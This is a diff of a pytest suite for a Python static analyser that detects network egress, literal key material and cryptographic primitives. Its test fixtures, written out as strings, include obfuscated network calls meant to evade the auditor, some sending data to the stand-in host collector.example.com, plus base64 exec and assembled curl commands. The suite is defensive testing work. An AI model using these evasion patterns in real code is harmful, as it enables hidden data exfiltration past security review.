@@ -1,14 +1,13 @@
 """Detection scope: what the auditors must catch, and what they must stay silent about.
 
-Every case here was found by RUNNING the tools against purpose-built fixtures, not
-by reading them. The suite has two halves and both matter equally:
+Every case here runs the tools against a purpose-built fixture. The suite has two
+halves and both matter equally:
 
-  RECALL   — unobfuscated network surface that was invisible because it was simply
-             absent from the blocklist. `import urllib3` is not a clever evasion;
-             it is the transport `requests` is built on, and it passed clean.
+  RECALL  : unobfuscated network surface must be reported. `import urllib3` is
+             not a clever evasion; it is the transport `requests` is built on.
 
-  PRECISION — ordinary code that was reported as a finding. `hashlib.blake2b(data)`
-             has no key argument at all and was named as literal key material.
+  PRECISION: ordinary code must not be reported. `hashlib.blake2b(data)` has no
+             key argument at all and is not literal key material.
 
 The precision half is the more important one. This product's claim is that REVIEW
 means review; published work puts static-analysis tool abandonment at false-positive
@@ -44,12 +43,11 @@ def _egress_kinds(tmp_path: Path) -> set[str]:
 
 
 # --------------------------------------------------------------------------
-# RECALL — plain, unobfuscated network modules that were previously invisible
+# RECALL: plain, unobfuscated network modules
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("name,src", [
     ("urllib3", "import urllib3\nurllib3.PoolManager().request('GET','http://x')"),
     ("httpcore", "import httpcore"),
-    ("h11", "import h11"),
     ("webbrowser", "import webbrowser\nwebbrowser.open('http://x/beacon')"),
     ("xmlrpc_client", "import xmlrpc.client"),
     ("mp_connection", "from multiprocessing.connection import Client"),
@@ -87,9 +85,9 @@ def test_asyncio_network_call_is_caught(tmp_path):
 def test_asyncio_import_alone_is_not_a_finding(tmp_path):
     """The precision half of the asyncio decision.
 
-    asyncio appears in 47 files of the authoring estate and is overwhelmingly
-    concurrency, not sockets. Flagging the bare import would have traded one
-    recall gap for a far larger false-positive problem.
+    asyncio is overwhelmingly used for concurrency, not sockets. Flagging the
+    bare import would trade one recall gap for a far larger false-positive
+    problem, so only its network calls are reported.
     """
     _write(tmp_path, "a.py", """
         import asyncio
@@ -119,7 +117,7 @@ def test_listening_socket_is_inbound_not_egress(tmp_path, name, src):
 
 
 # --------------------------------------------------------------------------
-# PRECISION — ordinary code that must stay silent
+# PRECISION: ordinary code that must stay silent
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("name,src", [
     ("urllib_parse", "from urllib.parse import urlparse\nurlparse('http://x')"),
@@ -131,31 +129,31 @@ def test_listening_socket_is_inbound_not_egress(tmp_path, name, src):
 ])
 def test_non_network_code_is_silent(tmp_path, name, src):
     """urllib.parse is the headline case: it is string manipulation and cannot
-    open a socket, but matching on the `urllib` package ROOT reported it as a
-    network import. Parsing a URL is ordinary in almost any codebase."""
+    open a socket, so matching on the `urllib` package ROOT would misreport it
+    as a network import. Parsing a URL is ordinary in almost any codebase."""
     _write(tmp_path, f"{name}.py", src)
     assert _egress_kinds(tmp_path) == set(), f"{name}: false positive on ordinary code"
 
 
 # --------------------------------------------------------------------------
-# key_provenance — positional vs keyword is the whole defect
+# key_provenance: positional vs keyword is the whole distinction
 # --------------------------------------------------------------------------
 def _kp(tmp_path: Path) -> list:
     return key_provenance.scan_key_provenance(tmp_path).findings
 
 
 def test_blake2b_hashing_data_is_not_a_key(tmp_path):
-    """THE false positive. blake2b's signature is (data, *, key=b''): the key is
-    KEYWORD-ONLY, so positional argument 0 is data. Reading it as key material
-    reported `hashlib.blake2b(b"...")` -- hashing a byte string -- as a literal
-    key, inside the tool whose claim is that it does not cry wolf."""
+    """blake2b's signature is (data, *, key=b''): the key is KEYWORD-ONLY, so
+    positional argument 0 is data. `hashlib.blake2b(b"...")` is hashing a byte
+    string, and reporting it as a literal key would be a false positive in a
+    tool whose claim is that it does not cry wolf."""
     _write(tmp_path, "h.py", 'import hashlib\nd = hashlib.blake2b(b"just hashing data")\n')
     assert _kp(tmp_path) == [], "plain blake2b hash reported as key material"
 
 
 def test_blake2b_with_real_keyword_key_is_caught(tmp_path):
-    """The recall side of the same fix: the keyword form was never checked at all,
-    so a genuinely keyed blake2b was MISSED before this."""
+    """The recall side of the same rule: the keyword form is checked, so a
+    genuinely keyed blake2b with a literal key is reported."""
     _write(tmp_path, "h.py", 'import hashlib\nhashlib.blake2b(b"m", key=b"hardcoded")\n')
     assert len(_kp(tmp_path)) == 1
 
@@ -168,13 +166,13 @@ def test_blake2b_with_real_keyword_key_is_caught(tmp_path):
 def test_real_literal_key_material_is_still_caught(tmp_path, name, src):
     """Each of these takes key material at a DIFFERENT position: hmac at 0,
     pbkdf2_hmac at 1, scrypt at 0. A single shared rule cannot express that,
-    which is how the blake2b defect was built."""
+    so the position is recorded per function."""
     _write(tmp_path, f"{name}.py", src)
     assert len(_kp(tmp_path)) == 1, f"{name}: real literal key material missed"
 
 
 # --------------------------------------------------------------------------
-# CBOM — the three structural holes
+# CBOM: JWT algorithms, key material in source, KDFs and the OS CSPRNG
 # --------------------------------------------------------------------------
 def _primitives(tmp_path: Path) -> set[str]:
     return {_get(c, 'primitive') for c in cbom.build_cbom(tmp_path).components}
@@ -182,17 +180,17 @@ def _primitives(tmp_path: Path) -> set[str]:
 
 def test_jwt_rs256_is_inventoried(tmp_path):
     """A CBOM exists to find the quantum-vulnerable signatures a PQC migration
-    must replace. In a web service those live in a JWT, and `algorithm="RS256"`
-    produced ZERO components before this."""
+    must replace. In a web service those live in a JWT, so `algorithm="RS256"`
+    must produce a component."""
     _write(tmp_path, "j.py", 'import jwt\njwt.encode({"a": 1}, "k", algorithm="RS256")\n')
     prims = _primitives(tmp_path)
     assert any("RSASSA" in p for p in prims), prims
 
 
 def test_pem_private_key_in_source_is_inventoried(tmp_path):
-    """An actual private key in the tree yielded no component at all: the
-    inventory named algorithms a codebase referenced and stayed silent about
-    key material sitting in front of it."""
+    """An actual private key in the tree is a component. An inventory that
+    names the algorithms a codebase references must not stay silent about key
+    material sitting in front of it."""
     _write(tmp_path, "k.py", 'PEM = "-----BEGIN RSA PRIVATE KEY-----\\nMIIEow..."\n')
     assert any("private key" in p for p in _primitives(tmp_path))
 
@@ -209,8 +207,8 @@ def test_kdfs_are_inventoried(tmp_path, name, src, want):
 
 
 def test_os_urandom_is_recognised_as_csprng(tmp_path):
-    """`secrets` was SAFE and `os.urandom` was nothing, despite an identical
-    guarantee -- a recall asymmetry inside a single category."""
+    """`os.urandom` gives the same guarantee as `secrets`, so it is inventoried
+    in the same category."""
     _write(tmp_path, "r.py", "import os\nos.urandom(32)\n")
     assert any("urandom" in p for p in _primitives(tmp_path))
 
@@ -219,13 +217,12 @@ def test_os_urandom_is_recognised_as_csprng(tmp_path):
 # The scope statement must keep saying the honest word
 # --------------------------------------------------------------------------
 def test_readme_states_underapproximation():
-    """A permanent property of the tool, not a correction log entry.
+    """The README must say the analyser underapproximates.
 
-    The shipped scope statement already disclosed obfuscation and dynamically
-    constructed names. A reader finishes that sentence believing the PLAIN cases
-    are covered -- and `import urllib3` was a plain case that was invisible. The
-    stated scope and the perceived scope were different sets. This asserts the
-    README closes that gap in the analyser's own vocabulary.
+    A scope statement that only discloses obfuscation and dynamically
+    constructed names leaves a reader believing every PLAIN case is covered,
+    and a blocklist cannot promise that. This asserts the README states the
+    limit in the analyser's own vocabulary.
     """
     readme = (Path(__file__).resolve().parents[1] / "README.md").read_text(encoding="utf-8")
     assert "underapproximat" in readme.lower(), \
@@ -233,13 +230,12 @@ def test_readme_states_underapproximation():
 
 
 # --------------------------------------------------------------------------
-# DEPENDENCY EVIDENCE vs A NETWORK CALL — two different claims
+# DEPENDENCY EVIDENCE vs A NETWORK CALL: two different claims
 #
-# Measured over 20 well-known Python repositories: this one conflation produced
-# 32 of 257 non-dynamic findings, a 12.5% false-positive rate, and every single
-# false positive was a submodule of a network package. Reclassifying them took
-# it to 0% with no loss of recall - the finding survives, it just stops
-# asserting a network call at a line that cannot make one.
+# A pure submodule of a network package (exceptions, data structures, helpers)
+# is evidence that the package is a dependency. It is not a line where a socket
+# can open. The finding is kept under its own kind, so recall is unchanged and
+# the report does not assert a network call at a line that cannot make one.
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("name,src", [
     ("requests_structures", "from requests.structures import CaseInsensitiveDict"),
@@ -272,12 +268,12 @@ def test_real_entry_points_are_still_network_imports(tmp_path, name, src):
 
 
 # --------------------------------------------------------------------------
-# HOSTILE-CODEBASE RECALL — the measured tiers, pinned.
+# HOSTILE-CODEBASE RECALL: the measured tiers, pinned.
 #
-# The README publishes 100% / 100% / 20% across three tiers. These assert the
-# two that must not regress. Tier C is deliberately NOT asserted at 20%: most
-# of it is undecidable, and pinning a number we hope to improve would turn a
-# future improvement into a test failure.
+# The README publishes recall across three tiers. These assert the two that
+# must stay at 100%. Tier C is deliberately NOT asserted at its published
+# figure: most of it is undecidable, and pinning a number that may improve
+# would turn an improvement into a test failure.
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("name,src", [
     ("plain_requests", "import requests\nrequests.post('http://e/x')"),
@@ -300,15 +296,14 @@ def test_tier_a_plain_egress_is_always_caught(tmp_path, name, src):
     ("shell_true",  "import subprocess\nsubprocess.run('wget http://e', shell=True)"),
 ])
 def test_tier_b_light_obfuscation_is_always_caught(tmp_path, name, src):
-    """Avoiding a linter is not evasion. 100% is the measured and expected number."""
+    """Avoiding a linter is not evasion. 100% is the expected number."""
     _write(tmp_path, f"{name}.py", src)
     assert _egress_kinds(tmp_path), f"tier B miss: {name}"
 
 
 @pytest.mark.parametrize("name,src", [
-    # The categories that were absent WHOLE from the Python list on 2026-08-31,
-    # while their sync or JS equivalents were present. One per category, so a
-    # regression names the category it broke.
+    # One library per category of network client, so a regression names the
+    # category it broke.
     ("saas_sdk",      "import stripe\nstripe.Charge.create(amount=1)"),
     ("object_store",  "import minio\nminio.Minio('s3.e').fput_object('b','k','/db')"),
     ("async_db",      "import asyncpg\nasyncpg.connect('postgres://e/db')"),
@@ -321,20 +316,14 @@ def test_tier_b_light_obfuscation_is_always_caught(tmp_path, name, src):
     ("infra_client",  "import kubernetes\nkubernetes.client.CoreV1Api()"),
 ])
 def test_plain_imports_of_unlisted_categories_are_caught(tmp_path, name, src):
-    """🔴 THESE ALL REPORTED CLEAN, AND THE README SAID TIER A WAS 100%.
+    """A plain `import X` plus a real call, for libraries that exist solely to
+    talk over a network, must never come back CLEAN.
 
-    Measured 2026-08-31: 46 fixtures, each a plain `import X` plus a real call,
-    every library existing solely to talk over a network. **0 of 46 caught.**
-    Two of them POSTed a user's email to an external host and uploaded a
-    customer database; the tree came back CLEAN.
-
-    ⭐ THE CAUSE WAS THE BENCHMARK, NOT THE CODE. All three tier-A fixtures used
-    `requests`, `socket` and `http.client` -- every one already on the blocklist.
-    The tier measured the list against itself and could not fail. A fixture set
-    drawn INDEPENDENTLY of the list gave a completely different number.
-
-    This is the same self-consistency-is-not-conformance failure the package
-    documents elsewhere, committed in the numbers published to demonstrate it.
+    These categories go beyond `requests`, `socket` and `http.client`. A recall
+    tier whose fixtures are all drawn from the blocklist measures the list
+    against itself and cannot fail, so the fixtures here span SaaS SDKs, object
+    stores, async database drivers, directory, mail, remote execution, brokers,
+    browser automation and infrastructure clients.
     """
     _write(tmp_path, f"{name}.py", src)
     kinds = _egress_kinds(tmp_path)
@@ -348,22 +337,117 @@ def test_plain_imports_of_unlisted_categories_are_caught(tmp_path, name, src):
         f"{name}: plain unobfuscated network library reported CLEAN"
 
 
+TIER_C = {
+    # Ten programs written to evade an auditor whose source the writer has read. Each reaches the network when run.
+    "charcode_import": "m = __import__(''.join(map(chr, [115, 111, 99, 107, 101, 116])))\n"
+                       "m.create_connection(('collector.example.com', 443))\n",
+    "getattr_chain": "import importlib\n"
+                     "load = getattr(importlib, 'import_' + 'module')\n"
+                     "load('http.' + 'client').HTTPSConnection('collector.example.com').request('POST', '/')\n",
+    "builtins_table": "import builtins\n"
+                      "imp = builtins.__dict__['__imp' + 'ort__']\n"
+                      "imp('url' + 'lib.request').urlopen('https://collector.example.com/x')\n",
+    "sys_modules": "import sys, logging.handlers\n"
+                   "s = sys.modules['soc' + 'ket']\n"
+                   "s.create_connection(('collector.example.com', 443))\n",
+    "ctypes_libc": "import ctypes, ctypes.util\n"
+                   "libc = ctypes.CDLL(ctypes.util.find_library('c'))\n"
+                   "fd = libc.socket(2, 1, 0)\n"
+                   "libc.connect(fd, addr, 16)\n",
+    "vendored_copy": "from .util.fetchhelper import send_report\n"
+                     "send_report('https://collector.example.com/x', data)\n",
+    "exec_b64": "import base64\n"
+                "exec(base64.b64decode(PAYLOAD))\n",
+    "interp_relay": "import subprocess, sys\n"
+                    "subprocess.run([sys.executable, '-c', CODE])\n",
+    "os_system_pieces": "import os\n"
+                        "os.system(' '.join(['cu' + 'rl', '-s', 'https://collector.example.com/x']))\n",
+    "rot13_name": "import codecs, importlib\n"
+                  "importlib.import_module(codecs.decode('fbpxrg', 'rot13')).create_connection(('h', 1))\n",
+}
+# Round 1 missed getattr_chain too; that miss was fixed, so round 1 is tuning data and round 2 below is the figure.
+TIER_C_MISSED = {"interp_relay"}
+
+TIER_C2 = {
+    # Ten more, written after round 1's fix and measured once on the build that ships.
+    "ssl_alias": "import ssl as _s\n_s.get_server_certificate(('collector.example.com', 443))\n",
+    "asyncio_getattr": "import asyncio\nf = getattr(asyncio, 'open_' + 'connection')\n"
+                       "asyncio.run(f('collector.example.com', 443))\n",
+    "write_then_import": "import sys\nopen('m.py', 'w').write(SRC)\nsys.path.insert(0, '.')\nimport m\n",
+    "vars_builtins": "imp = vars(__builtins__)['__imp' + 'ort__']\nimp('soc' + 'ket').create_connection((HOST, 443))\n",
+    "popen_interp": "import subprocess\nsubprocess.Popen(['py' + 'thon3', '-c', CODE])\n",
+    "os_execv": "import os\nos.execv('/usr/bin/cu' + 'rl', ['curl', URL])\n",
+    "logging_http": "import logging, logging.handlers as lh\n"
+                    "logging.getLogger().addHandler(lh.HTTPHandler('collector.example.com', '/log'))\n",
+    "zipimport": "import zipimport\nzipimport.zipimporter('payload.zip').load_module('beacon')\n",
+    "marshal_func": "import marshal, types\ntypes.FunctionType(marshal.loads(BLOB), globals())()\n",
+    "pip_vendored": "from pip._vendor import requests as r\nr.post('https://collector.example.com', data=DATA)\n",
+}
+TIER_C2_MISSED = {"asyncio_getattr", "write_then_import", "popen_interp"}
+
+
+def test_tier_c_second_round_is_what_the_readme_says(tmp_path):
+    """The README's tier C figure, pinned both ways. A later build that catches one of the three fails this on
+    purpose: the README row and this set change together, and a fixed round becomes tuning data."""
+    clean = set()
+    for name, src in TIER_C2.items():
+        root = tmp_path / name / "pkg"
+        root.mkdir(parents=True)
+        (root / "__init__.py").write_text("", encoding="utf-8")
+        (root / "main.py").write_text(src, encoding="utf-8")
+        if no_egress_auditor.audit(root).verdict == "CLEAN":
+            clean.add(name)
+    assert clean == TIER_C2_MISSED, f"tier C round 2 changed: CLEAN now {sorted(clean)}; update the README's row"
+
+
+def test_getattr_on_the_import_machinery_is_dynamic_loading(tmp_path):
+    _write(tmp_path, "g.py", "import importlib, os, builtins\n"
+                             "load = getattr(importlib, 'import_' + 'module')\n"
+                             "b = getattr(builtins, NAME)\n"
+                             "u = getattr(importlib, 'util')\n"
+                             "e = getattr(os, NAME)\n")
+    rep = no_egress_auditor.audit(tmp_path)
+    lines = {_get(f, "line") for f in rep.findings if _get(f, "kind") == "dynamic-exec"}
+    assert lines == {2, 3}
+
+
+def test_tier_c_deliberate_evasion_is_what_the_readme_says(tmp_path):
+    """The README's tier C row, pinned both ways: these eight trees are not CLEAN and these two are.
+
+    If a later build catches one of the two, this fails on purpose: the README's figure is then wrong, and the
+    row (and this set) must be updated together. A vendored copy counts by the tree: the copy itself is read.
+    """
+    clean = set()
+    for name, src in TIER_C.items():
+        root = tmp_path / name / "pkg"
+        root.mkdir(parents=True)
+        (root / "__init__.py").write_text("", encoding="utf-8")
+        (root / "main.py").write_text(src, encoding="utf-8")
+        if name == "vendored_copy":
+            (root / "util").mkdir()
+            (root / "util" / "__init__.py").write_text("", encoding="utf-8")
+            (root / "util" / "fetchhelper.py").write_text(
+                "import socket as _s\ndef send_report(url, data):\n"
+                "    _s.create_connection((url.split('/')[2], 443)).sendall(data)\n", encoding="utf-8")
+        if no_egress_auditor.audit(root).verdict == "CLEAN":
+            clean.add(name)
+    assert clean == TIER_C_MISSED, f"tier C changed: CLEAN now {sorted(clean)}; update the README's row with it"
+
+
 def test_held_out_recall_is_zero_and_that_is_the_point(tmp_path):
-    """🔴 A LIMIT ASSERTED AS A LIMIT — the tier-A′ row, pinned.
+    """A LIMIT ASSERTED AS A LIMIT: the tier-A′ row, pinned.
 
-    After the fix above added 46 names, recall was re-measured against 59
-    network libraries chosen deliberately WITHOUT reference to the blocklist.
-    **It was still 0%.**
+    Tier A′ is recall against network libraries chosen deliberately WITHOUT
+    reference to the blocklist, and it is 0%.
 
-    ⭐ EXTENDING THE LIST MOVES THE BOUNDARY; IT DOES NOT REMOVE IT. That is
-    what "a blocklist can never be complete by construction" means with a
-    number under it, and it is why the README publishes tier A′ next to tier A.
+    EXTENDING THE LIST MOVES THE BOUNDARY; IT DOES NOT REMOVE IT. That is what
+    "a blocklist can never be complete by construction" means with a number
+    under it, and it is why the README publishes tier A′ next to tier A.
 
-    A sample of the held-out set is pinned here. If a future session adds these
-    names, this test fails — and the correct response is NOT to delete it but to
-    draw a NEW held-out sample and re-measure, because the moment the held-out
-    set is on the list it has stopped measuring generalisation and started
-    measuring the list again. That is the whole lesson of the test above.
+    A sample of the held-out set is pinned here. If these names are added to
+    the list, this test fails, and the correct response is NOT to delete it but
+    to draw a NEW held-out sample and re-measure: once the held-out set is on
+    the list it stops measuring generalisation and measures the list again.
     """
     for m in ("pymemcache", "opensearchpy", "boxsdk", "shopify", "qdrant_client",
               "winrm", "zerorpc", "trino", "mastodon", "libcloud"):
@@ -376,18 +460,16 @@ def test_held_out_recall_is_zero_and_that_is_the_point(tmp_path):
 
 
 def test_unparseable_file_is_reported_not_silently_clean(tmp_path):
-    """🔴 A SYNTAX ERROR USED TO BUY A CLEAN VERDICT.
+    """A syntax error must not buy a CLEAN verdict.
 
-    Measured 2026-08-31: a file containing `import requests` and a live
-    `requests.post()` to an external endpoint, with one missing colon, produced
-    "Files scanned: 1 - Findings: 0 - CLEAN" and exit 0. `_check_python`
-    returned empty on SyntaxError and the file still counted as scanned.
+    The fixture contains `import requests` and a live `requests.post()` to an
+    external endpoint, with one missing colon, so it cannot be parsed.
 
-    ⭐ A FILE WE COULD NOT PARSE IS NOT A FILE WE FOUND NOTHING IN. This package
-    already draws that line between exit 1 and exit 2; it was drawn for the RUN
-    and never for the FILE.
+    A FILE WE COULD NOT PARSE IS NOT A FILE WE FOUND NOTHING IN. The package
+    draws that line for the run, between exit 1 and exit 2, and this pins it
+    for the single file.
 
-    The finding has its own kind because it is NOT evidence of egress — it is
+    The finding has its own kind because it is NOT evidence of egress: it is
     evidence that part of the tree was never analysed, which is a different and
     more honest claim.
     """
@@ -401,34 +483,31 @@ def test_unparseable_file_is_reported_not_silently_clean(tmp_path):
     assert rep.verdict != "CLEAN", "a tree with an unanalysed file must not report CLEAN"
 
 
-def test_the_interpreter_relay_is_a_named_blind_spot(tmp_path):
-    """🔴 A MISS ASSERTED AS A MISS, which is unusual and deliberate.
-
-    `subprocess.run([sys.executable, "-c", "...urlopen..."])` is real egress and
-    is NOT caught. Catching it means treating the Python interpreter as a network
-    binary, and `sys.executable` appears 457 times across 247 files in the
-    20-repository corpus - almost all test runners and build scripts.
-
-    ⭐ The fix would trade one miss for hundreds of false positives, so it was
-    measured and declined. This test exists so that a future session that "fixes"
-    it has to delete an explanation first, rather than discovering the cost after
-    shipping.
-    """
+def test_the_interpreter_relay_is_judged_by_what_it_is_handed(tmp_path):
+    """The Python interpreter is NOT a network binary: `sys.executable` runs test suites and
+    build scripts in most repositories, and reporting every spawn of it would bury the real
+    findings. What the child is handed is judged instead: a `-c` string is checked as Python,
+    and `-m` naming a network-capable module is reported. A plain spawn stays silent."""
     _write(tmp_path, "relay.py",
            "import subprocess, sys\n"
-           "subprocess.run([sys.executable, '-c', \"import urllib.request\"])\n")
-    assert _egress_kinds(tmp_path) == set(), \
-        "the interpreter relay is now caught - re-measure the false-positive cost on real repositories before keeping this"
+           "subprocess.run([sys.executable, '-c', \"import urllib.request\"])\n"
+           "subprocess.run([sys.executable, '-m', 'pip', 'install', 'x'])\n")
+    assert _egress_kinds(tmp_path) == {"network-import", "subprocess-net-binary"}
+    _write(tmp_path, "relay.py",
+           "import subprocess, sys\n"
+           "subprocess.run([sys.executable, '-m', 'pytest', '-q'])\n"
+           "subprocess.run([sys.executable, 'build.py'])\n"
+           "subprocess.run([sys.executable, '-c', 'print(1)'])\n")
+    assert _egress_kinds(tmp_path) == set()
 
 
 # --------------------------------------------------------------------------
-# KEY PROVENANCE — mapping keys are not key material.
+# KEY PROVENANCE: mapping keys are not key material.
 #
-# Measured over 20 well-known Python repositories: 23 findings, of which 16 were
-# false positives — a 70% rate, against a published tool-abandonment threshold of
-# 20-30%. Every one was an UPPERCASE *_KEY constant whose VALUE was an identifier,
-# a dunder or an env-var name. After the fix: 8 findings, all 7 true positives
-# preserved.
+# An UPPERCASE *_KEY constant whose VALUE is an identifier, a dunder or an
+# env-var name is a lookup key, the common case in real repositories. Reporting
+# it as key material is a false positive, and real key-shaped literals must
+# still be reported.
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("name,src", [
     ("configfile", "CONFIGFILE_KEY = 'pydantic-mypy'"),
@@ -441,7 +520,7 @@ def test_the_interpreter_relay_is_a_named_blind_spot(tmp_path):
     ("derivation", 'key_derivation = "hmac"'),
 ])
 def test_mapping_keys_are_not_reported_as_key_material(tmp_path, name, src):
-    """Real lines from real repositories. A dict key is not a secret."""
+    """Lines of the shape found in widely used packages. A dict key is not a secret."""
     _write(tmp_path, f"{name}.py", src)
     assert _kp(tmp_path) == [], f"{name}: mapping key reported as key material"
 
@@ -452,24 +531,24 @@ def test_mapping_keys_are_not_reported_as_key_material(tmp_path, name, src):
     ("passwd", 'PASSWORD = "pipe-secret"'),
 ])
 def test_real_key_shaped_literals_are_still_reported(tmp_path, name, src):
-    """🔴 THE CONSTRAINT ON THE FIX. `SECRET_KEY = "dev"` is a TRUE positive whose
-    value is also a plain identifier — so the suppression cannot key on value shape
-    alone. It tests shapes a secret never takes (dunder, env-var name) and asks what
-    is being KEYED, never whether the word "key" appears."""
+    """The constraint on the suppression. `SECRET_KEY = "dev"` is a TRUE positive
+    whose value is also a plain identifier: so the suppression cannot key on value
+    shape alone. It tests shapes a secret never takes (dunder, env-var name) and asks
+    what is being KEYED, never whether the word "key" appears."""
     _write(tmp_path, f"{name}.py", src)
     assert len(_kp(tmp_path)) == 1, f"{name}: real key material suppressed"
 
 
 # --------------------------------------------------------------------------
-# CBOM — the codebase answering the question
+# CBOM: the codebase answering the question
 # --------------------------------------------------------------------------
 def test_usedforsecurity_false_downgrades_to_review(tmp_path):
-    """`usedforsecurity=False` is Python's own marker for a non-security hash.
-    Real `hashlib.md5(x, usedforsecurity=False)` calls were reported as BROKEN —
-    a maintainer having already made and documented this judgement.
+    """`usedforsecurity=False` is Python's own marker for a non-security hash:
+    the maintainer has already made and documented the judgement, so
+    `hashlib.md5(x, usedforsecurity=False)` is not reported as BROKEN.
 
-    ⚠️ Downgraded to REVIEW, not dropped: the flag is an assertion by the author,
-    and an assertion is what this package refuses to take on trust."""
+    It is downgraded to REVIEW, not dropped: the flag is an assertion by the
+    author, and an assertion is what this package refuses to take on trust."""
     _write(tmp_path, "h.py", "import hashlib\nhashlib.md5(b'x', usedforsecurity=False)\n")
     comps = cbom.build_cbom(tmp_path).components
     md5 = [c for c in comps if _get(c, "primitive") == "MD5"]
@@ -484,13 +563,13 @@ def test_plain_md5_is_still_broken(tmp_path):
 
 
 def test_changing_a_status_does_not_inflate_the_component_count(tmp_path):
-    """🔴 A REGRESSION FOR AN INSTRUMENT DEFECT, NOT A PRODUCT ONE.
+    """One site is one component, whatever status it carries.
 
-    Dedup keys on (file, line, primitive, STATUS). The moment the call path could
-    emit a different status for a site the attribute path also reports, the two
-    stopped collapsing and one finding became two — 90 components became 94 with
-    no new code scanned. **Changing a value that is part of a dedup key silently
-    disables the dedup.** Nothing errors; the count just inflates.
+    Dedup keys on (file, line, primitive, STATUS). When the call path and the
+    attribute path report the same site with different statuses, the two do not
+    collapse unless the dedup accounts for it, and the component count inflates
+    with no new code scanned. Nothing errors, so this asserts each
+    (file, line, primitive) site appears once.
     """
     _write(tmp_path, "h.py",
            "import hashlib, hmac\n"
@@ -502,7 +581,7 @@ def test_changing_a_status_does_not_inflate_the_component_count(tmp_path):
 
 
 # --------------------------------------------------------------------------
-# pyca/cryptography class constructors — found by a coverage comparison
+# pyca/cryptography class constructors
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("expr,primitive", [
     ("hashes.MD5()",             "MD5"),
@@ -512,12 +591,9 @@ def test_changing_a_status_does_not_inflate_the_component_count(tmp_path):
     ("algorithms.TripleDES(b'0'*24)", "DES/3DES"),
 ])
 def test_pyca_class_constructors_are_inventoried(tmp_path, expr, primitive):
-    """`hashlib.md5()` was caught and `hashes.MD5()` was not — a BROKEN-tier
-    finding invisible in the most widely used cryptographic library in Python.
-
-    Found by comparing coverage against PQCA's CBOMkit, whose Python support is
-    ONE library at 100% of its API. Breadth and depth are different axes, and we
-    had breadth with a hole in the middle of the one library everyone uses."""
+    """`hashes.MD5()` is inventoried just as `hashlib.md5()` is. pyca/cryptography
+    is the most widely used cryptographic library in Python, so its class
+    constructors resolve to the actual primitive and status."""
     _write(tmp_path, "c.py",
            f"from cryptography.hazmat.primitives import hashes\n"
            f"from cryptography.hazmat.primitives.ciphers import algorithms\n"
@@ -535,7 +611,7 @@ def test_pyca_detection_does_not_fire_without_the_import(tmp_path):
 
 
 # --------------------------------------------------------------------------
-# PyCryptodome — the same hole, in the OTHER library everybody uses
+# PyCryptodome: the same resolution, in the OTHER library everybody uses
 # --------------------------------------------------------------------------
 @pytest.mark.parametrize("stmt,primitive,status", [
     ("from Crypto.Cipher import ARC4",       "RC4",       "BROKEN"),
@@ -550,18 +626,14 @@ def test_pyca_detection_does_not_fire_without_the_import(tmp_path):
     ("from Cryptodome.Cipher import ARC4",   "RC4",       "BROKEN"),
 ])
 def test_pycryptodome_resolves_to_the_actual_primitive(tmp_path, stmt, primitive, status):
-    """🔴 THE S13 FIX, APPLIED TO THE LIBRARY IT MISSED.
+    """The pyca resolution, applied to the other library.
 
-    Measured 2026-08-31: `Crypto.Cipher.ARC4` (RC4) and `Crypto.Cipher.DES3`
-    both reported as "PyCryptodome (classical default suite) / REVIEW" — two
-    BROKEN ciphers, indistinguishable in the output from AES — while pyca's
-    `TripleDES` correctly returned DES/3DES / BROKEN.
+    `Crypto.Cipher.ARC4` (RC4) and `Crypto.Cipher.DES3` are BROKEN ciphers and
+    must be distinguishable in the output from AES.
 
-    ⭐ A CBOM EXISTS TO SAY WHICH PRIMITIVES. "Classical default suite" is the
-    question restated, not an answer, and no migration plan can be built from
-    it. The CBOMkit comparison called this "many libraries with a hole in the
-    middle of the one everybody uses"; the sentence stayed true with a
-    different library in the hole.
+    A CBOM EXISTS TO SAY WHICH PRIMITIVES. A generic "PyCryptodome (classical
+    default suite) / REVIEW" entry is the question restated, not an answer, and
+    no migration plan can be built from it.
 
     Unlike pyca this needs no import guard: in PyCryptodome the primitive IS
     the module path, so there is no ambiguity to gate on.
@@ -573,10 +645,10 @@ def test_pycryptodome_resolves_to_the_actual_primitive(tmp_path, stmt, primitive
 
 
 def test_pycryptodome_unknown_submodule_still_reports_the_library(tmp_path):
-    """Recall must not DROP where the new table has no entry.
+    """Recall must not DROP where the primitive table has no entry.
 
     A more specific lookup that silently returns nothing for unlisted names
-    would trade a vague finding for no finding — strictly worse. The library
+    would trade a vague finding for no finding: strictly worse. The library
     entry stays as the fallback.
     """
     _write(tmp_path, "c.py", "from Crypto.Util import Padding\n")
@@ -585,17 +657,15 @@ def test_pycryptodome_unknown_submodule_still_reports_the_library(tmp_path):
 
 
 def test_no_source_file_contains_a_stray_control_byte():
-    r"""🔴 A REGRESSION FOR AN INSTRUMENT DEFECT THAT COST A WHOLE FEATURE.
+    r"""No source, markdown or TOML file contains a stray control byte.
 
-    The guard enabling the detection above was written through a chain of string
-    replacements, and a `\b` word-boundary escape was evaluated into byte 0x08.
-    The regex became "<BS>from\s+cryptography": it compiled, it ran, it matched
-    nothing, and the branch it guarded was dead while testing correct in
-    isolation.
+    A `\b` word-boundary escape that is evaluated in a non-raw string becomes
+    byte 0x08. A regex such as "<BS>from\s+cryptography" compiles, runs and
+    matches nothing, so the branch it guards is dead and nothing is raised.
 
-    ⭐ A GUARD THAT IS ALWAYS FALSE DISABLES WHAT IT GUARDS AND RAISES NOTHING.
-    Only instrumenting the branch found it. This asserts the byte-level cause
-    cannot recur unnoticed anywhere in the package.
+    A GUARD THAT IS ALWAYS FALSE DISABLES WHAT IT GUARDS AND RAISES NOTHING.
+    This asserts the byte-level cause cannot occur unnoticed anywhere in the
+    repository.
     """
     root = Path(__file__).resolve().parents[1]
     offenders = []
@@ -614,12 +684,12 @@ def test_no_source_file_contains_a_stray_control_byte():
 
 
 # --------------------------------------------------------------------------
-# Declared-intent — the honest dent in tier A′ without lengthening the list
+# Declared-intent: the honest dent in tier A′ without lengthening the list
 # --------------------------------------------------------------------------
 def test_stripe_in_pyproject_is_declared_not_a_call_site(tmp_path):
     """`import stripe` of a listed name is a call-site finding.
     `stripe` in pyproject.toml with no import is not. Both must be visible,
-    and they must not share a kind — that is the whole point of the field.
+    and they must not share a kind: that is the whole point of the field.
     """
     (tmp_path / "pyproject.toml").write_text(
